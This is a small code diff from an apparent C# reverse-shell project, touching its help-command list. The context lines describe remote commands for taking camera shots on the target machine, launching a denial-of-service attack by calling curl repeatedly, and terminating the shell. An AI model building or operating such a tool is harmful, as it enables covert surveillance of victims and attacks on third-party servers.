@@ -63,6 +63,8 @@ namespace WebSocketReverseShellDotNet.service.commands
 
                 new HelpCommand("/camerashot", "take camera shot",
             "NA", "/camerashot"),
+
+  
                 new HelpCommand("/attack", "start denial of service attack by calling curl every few seconds",
             "arg1= ['curl' or 'stop']", "'/attack curl <rest of the command>' or '/attack stop'"),
                 new HelpCommand("/exit", "Terminate shell",
